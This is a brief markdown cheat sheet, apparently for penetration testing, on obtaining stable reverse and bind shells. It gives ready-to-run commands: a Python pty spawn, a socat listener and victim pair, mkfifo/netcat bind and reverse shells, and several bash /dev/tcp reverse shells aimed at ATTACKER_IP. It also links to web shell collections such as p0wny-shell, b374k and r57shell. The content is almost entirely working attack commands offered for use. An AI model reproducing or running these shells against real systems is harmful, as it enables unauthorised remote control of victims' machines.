# Stable revers Shell 

### Using Python for a psuedo terminal
```
python -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo
```

## Using socat
```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## Bind Shell 
```
# Victim Machine

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

# Attacker Machine

nc -nv victim_ip victim_port
```

## Reversh Shell

```
## Victim Machine

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc attcker_ip attacker_port > /tmp/f

## Attacker

nc -nlvp victim_IP victim_PORT 

```


## Try this 

```
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 

exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done

0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196

```

## Web Shell

* [https://github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell)
* [https://github.com/b374k/b374k](https://github.com/b374k/b374k)
* [https://www.r57shell.net/single.php?id=13](https://www.r57shell.net/single.php?id=13)

You can find more web shells at: https://www.r57shell.net/index.php.

